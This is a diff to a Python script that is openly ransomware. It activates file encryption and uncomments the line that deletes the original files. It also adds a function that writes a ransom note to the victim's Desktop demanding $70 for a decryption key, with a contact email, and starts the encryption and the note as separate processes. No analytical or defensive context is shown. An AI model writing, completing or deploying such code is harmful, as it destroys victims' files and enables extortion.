@@ -12,7 +12,7 @@ import requests
 from multiprocessing import Process
 #detect platform
 import platform
-
+import time
 
 
 
@@ -104,10 +104,32 @@ def encfile():
             file3.write(encrtpt_file)
             file2.close()
             file3.close()
-            # os.remove(path)
+            os.remove(path)
         except:
             pass
     file.close()
+
+
+
+
+def notep():
+    msg = """
+    all file has ben encrypted 
+    tell me to give decrypt key
+    give me 70$ to send your key
+    my email : matinnoryan@gmail.com
+    """
+    desk = os.path.expanduser("~"+"\\Desktop")
+    file = open(desk+'hack.txt',"w+")
+    file.write(msg)
+    file.close()
+
+
+
+
+
+
+
 
 
 # run all functions for encryption
@@ -125,7 +147,7 @@ def runsam():
     #find all file with enable drive
     find_file(drv)
     # #encrypt
-    # encfile()
+    encfile()
     
     
 
@@ -133,7 +155,11 @@ def runsam():
 
 #w processing 
 if __name__ == "__main__":
-    pr2 = Process(name="senkey",target=runsam)
+    pr1 = Process(name="samw", target=runsam)
+    pr1.start()
+    time.sleep(15)
+    pr2 = Process(name="senkey",target=notep)
     pr2.start()
+
 
     
